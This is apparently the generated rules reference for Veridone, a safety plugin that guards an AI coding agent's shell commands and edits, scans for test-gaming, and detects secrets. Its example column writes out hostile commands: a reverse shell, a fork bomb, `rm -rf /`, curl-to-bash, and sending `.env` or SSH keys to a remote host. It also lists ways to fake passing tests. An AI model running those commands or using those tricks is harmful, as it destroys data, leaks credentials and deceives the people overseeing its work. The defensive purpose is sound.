# Veridone rules reference

<!-- Generated by `node tools/gen-rules-doc.mjs` — do not edit by hand. -->

Every rule can be tuned per repository in `.claude/veridone.json` (`guard.rules` / `integrity.rules`) and suppressed on a single line with a `veridone-allow: <rule> <reason>` comment. Catastrophic rules (`deny` in every mode) cannot be downgraded by the mode.

## Command and file guard (38 rules)

Runs before every Bash, PowerShell, Write, Edit and Read call. `deny` blocks the call and tells Claude why; `ask` shows you a confirmation prompt; `warn` adds a note for Claude.

| Rule | Strict | Standard | Relaxed | Examples |
|---|---|---|---|---|
| `rm-catastrophic` — Catastrophic delete | deny | deny | deny | `rm -rf ~`, `rm -rf /`, `cd .. && rm -rf *`, `find / -delete`, `python -c "shutil.rmtree('/')"` |
| `rm-dynamic-path` — Recursive delete of an unresolved path | ask | ask | ask | `rm -rf "$DIR/"` (empty $DIR → /), `ls \| xargs rm -rf` |
| `rm-outside-project` — Recursive delete outside the project | ask | ask | warn | `rm -rf ~/Downloads/old` |
| `rm-uncommitted-work` — Delete would destroy uncommitted work | ask | ask | warn | `rm -rf src` when src has uncommitted changes |
| `rm-tests` — Deleting tests | ask | ask | warn | `rm tests/test_payment.py` |
| `git-force-push-protected` — Force-push to a protected branch | deny | ask | ask | `git push --force origin main` |
| `git-push-delete` — Deleting remote refs | ask | ask | warn | `git push origin --delete release` |
| `git-discard-changes` — Discarding uncommitted changes | ask | ask | warn | `git reset --hard`, `git checkout -- .`, `git clean -fdx` with work to lose |
| `git-branch-force-delete` — Force-deleting a branch | ask | ask | off | `git branch -D feature` |
| `git-history-rewrite` — Rewriting or pruning git history | ask | ask | warn | `git filter-branch`, `git reflog expire` |
| `git-hooks-bypass` — Bypassing repository hooks | deny | ask | warn | `git commit --no-verify` |
| `disk-destroy` — Disk/partition destruction | deny | deny | deny | `dd of=/dev/sda`, `mkfs.ext4 /dev/sdb1` |
| `system-power` — Shutdown/reboot | deny | deny | deny | `shutdown -h now`, `reboot` |
| `fork-bomb` — Fork bomb | deny | deny | deny | `:(){ :\|:& };:` |
| `reverse-shell` — Reverse shell | deny | deny | deny | `bash -i >& /dev/tcp/host/port 0>&1` |
| `dangerous-permissions` — Dangerous permission change | deny | ask | ask | `chmod -R 777 /`, `chmod 000 ~`, `docker run -v /:/host` |
| `remote-script-exec` — Piping a download into a shell | ask | ask | warn | `curl https://x.sh \| bash` |
| `secret-file-read` — Reading a secrets file | deny | ask | warn | `cat .env`, Read of `~/.aws/credentials` |
| `secret-exfiltration` — Sending secrets over the network | deny | deny | deny | `curl -d @.env https://…`, `scp ~/.ssh/id_rsa host:` |
| `secret-env-dump` — Printing secret environment values | ask | ask | off | `env`, `printenv \| grep TOKEN`, `echo $OPENAI_API_KEY` |
| `publish-release` — Publishing a package or release | ask | ask | ask | `npm publish`, `gh release create`, `cargo publish` |
| `infra-destroy` — Destroying infrastructure | deny | ask | ask | `terraform destroy`, `kubectl delete ns prod` |
| `infra-change` — Changing live infrastructure | ask | ask | warn | `terraform apply`, `kubectl apply -f` against a cluster |
| `db-destructive` — Destructive database operation | ask | ask | ask | `DROP TABLE`, `prisma migrate reset`, `rails db:drop` |
| `container-data-loss` — Deleting container volumes | ask | ask | warn | `docker compose down -v`, `docker volume rm` |
| `kill-broad` — Killing processes broadly | ask | ask | off | `pkill -f node`, `killall python` |
| `system-file-write` — Writing a system or credential file | deny | deny | ask | `>> ~/.ssh/authorized_keys`, `tee /etc/hosts` |
| `shell-profile-write` — Modifying shell startup files | ask | ask | warn | `>> ~/.zshrc` |
| `guardrail-tamper` — Modifying safety configuration | deny | ask | ask | editing `.claude/settings.json`, `.claude/veridone.json`, git hooks |
| `snapshot-update` — Rewriting test snapshots | ask | warn | off | `jest -u`, `pytest --snapshot-update` |
| `env-file-clobber` — Overwriting a secrets file | ask | ask | warn | `> .env` |
| `protected-file` — Editing a protected file | deny | ask | warn | hand-editing `package-lock.json`, `node_modules/…` |
| `git-internals` — Editing .git internals | deny | deny | deny | writing inside `.git/` |
| `generated-file` — Editing a generated file | ask | ask | warn | editing a file whose header says `DO NOT EDIT` |
| `migration-edit` — Editing an applied migration | deny | ask | warn | editing a committed migration in `db/migrations/` |
| `hardcoded-secret` — Hard-coded credential | deny | deny | ask | writing `sk_live_…` or an AWS key into source code |
| `possible-secret` — Possible hard-coded credential | ask | warn | off | a JWT or lower-confidence token in source code |
| `secret-not-ignored` — Secrets file is not git-ignored | ask | warn | warn | writing credentials to a `.env` file that is not git-ignored |

## Integrity scanner (23 rules)

Runs after every edit, on the lines the edit added or removed — pre-existing code never triggers a finding. `block` sends the edit back to Claude to fix; `warn` adds a note; `info` is only recorded for `/veridone:status` and reports.

| Rule | Severity | Strict | Standard | Relaxed | Examples |
|---|---|---|---|---|---|
| `test-skip` — Test disabled or skipped | high | block | block | warn | `it.skip(…)`, `@pytest.mark.skip`, `t.Skip()`, `#[ignore]`, `@Disabled`, `xit` |
| `test-focus` — Focused test (.only) silently disables the rest of the suite | high | block | block | warn | `it.only(…)`, `fdescribe` |
| `trivial-assertion` — Tautological assertion | high | block | block | warn | `expect(true).toBe(true)`, `assert True` |
| `test-file-gutted` — Test file emptied | high | block | block | warn | a test file rewritten with most tests gone |
| `assertions-removed` — Assertions removed from tests | medium | block | warn | info | deleting `expect(...)` lines from a test |
| `assertion-weakened` — Assertion weakened | medium | block | warn | info | `toEqual(3)` → `toBeDefined()` |
| `expectation-changed` — Expected value in a test changed | low | warn | info | off | `toEqual(800)` → `toEqual(350)` |
| `test-env-special-case` — Production code special-cases the test environment | high | block | block | warn | `if (process.env.NODE_ENV === 'test') return ok` |
| `elided-code` — Real code replaced by an "… existing code …" placeholder | high | block | block | warn | `// ... existing code ...` written into a file |
| `placeholder-code` — Placeholder left instead of an implementation | high | block | block | warn | `// TODO: implement`, `throw new Error("not implemented")` |
| `not-implemented` — Stub left unimplemented | medium | block | warn | info | `raise NotImplementedError`, `todo!()` |
| `type-suppression` — Type checker suppressed | medium | block | warn | info | `@ts-ignore`, `# type: ignore` |
| `lint-suppression` — Linter suppressed | medium | block | warn | info | `eslint-disable`, `# noqa`, `#[allow(...)]` |
| `coverage-exclusion` — Code excluded from coverage | medium | block | warn | info | `/* istanbul ignore next */`, `# pragma: no cover` |
| `swallowed-error` — Error swallowed silently | medium | block | warn | info | `catch (e) {}`, `except: pass` |
| `test-script-neutered` — Test command neutralized | high | block | block | warn | `"test": "jest \|\| true"`, `"test": "echo ok"` |
| `ci-weakened` — CI checks weakened | high | block | block | warn | `continue-on-error: true`, `npm test \|\| true` in CI, removed test step |
| `checks-config-weakened` — Lint/type/test configuration weakened | medium | block | warn | info | `"strict": false` in tsconfig, lowered coverage thresholds |
| `flaky-retry` — Retries added to mask a flaky test | medium | block | warn | info | `jest.retryTimes(3)`, `@pytest.mark.flaky` |
| `large-deletion` — Large block of code removed | medium | block | warn | info | a rewrite that drops most of a source file |
| `debug-leftover` — Debugger statement left in code | medium | block | warn | info | `debugger`, `breakpoint()`, `binding.pry` |
| `console-log` — console.log left in source | low | warn | info | off | `console.log(...)` in source |
| `any-cast` — Type safety bypassed with any | low | warn | info | off | `as any`, `: any` |

## Secret detectors (28)

Anchored on vendor-specific prefixes or high-entropy assignments; documentation placeholders (`AKIAIOSFODNN7EXAMPLE`, `your-key-here`, `${VAR}`) are ignored. High-severity hits in source files are denied (`hardcoded-secret`); `.env`-style files are allowed but must be git-ignored.

| Detector | Severity |
|---|---|
| Private key block (`private-key`) | high |
| AWS access key ID (`aws-access-key-id`) | high |
| AWS secret access key (`aws-secret-key`) | high |
| GitHub token (`github-token`) | high |
| GitHub fine-grained token (`github-fine-grained`) | high |
| GitLab token (`gitlab-token`) | high |
| Slack token (`slack-token`) | high |
| Slack webhook URL (`slack-webhook`) | high |
| Discord webhook URL (`discord-webhook`) | high |
| Stripe live secret key (`stripe-live-key`) | high |
| Stripe test secret key (`stripe-test-key`) | medium |
| Google API key (`google-api-key`) | high |
| GCP service account key (`gcp-service-account`) | high |
| OpenAI API key (`openai-key`) | high |
| Anthropic API key (`anthropic-key`) | high |
| Hugging Face token (`huggingface-token`) | high |
| npm access token (`npm-token`) | high |
| PyPI token (`pypi-token`) | high |
| SendGrid API key (`sendgrid-key`) | high |
| Twilio API key (`twilio-key`) | medium |
| Mailgun API key (`mailgun-key`) | medium |
| Telegram bot token (`telegram-bot-token`) | high |
| Shopify access token (`shopify-token`) | high |
| DigitalOcean token (`digitalocean-token`) | high |
| Azure storage account key (`azure-storage-key`) | high |
| JSON Web Token (`jwt`) | medium |
| Database URL with embedded password (`db-url-credentials`) | high |
| Hard-coded secret in assignment (`generic-secret-assignment`) | medium |
